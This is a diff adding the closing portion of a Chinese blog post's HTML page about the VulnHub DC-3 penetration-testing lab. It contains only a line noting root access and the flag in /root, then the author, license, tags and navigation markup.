+<p>可以看到已经变成了root权限，最后在<code>/root</code>目录下找到flag：</p>
+<p><img src="/2020/06/27/VulnHub_DC-3/imgs/19.png" alt="19"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/06/27/VulnHub_DC-3/">https://bantttian.github.io/2020/06/27/VulnHub_DC-3/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/06/22/VulnHub_DC-2/">VulnHub_DC-2靶机渗透测试学习</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
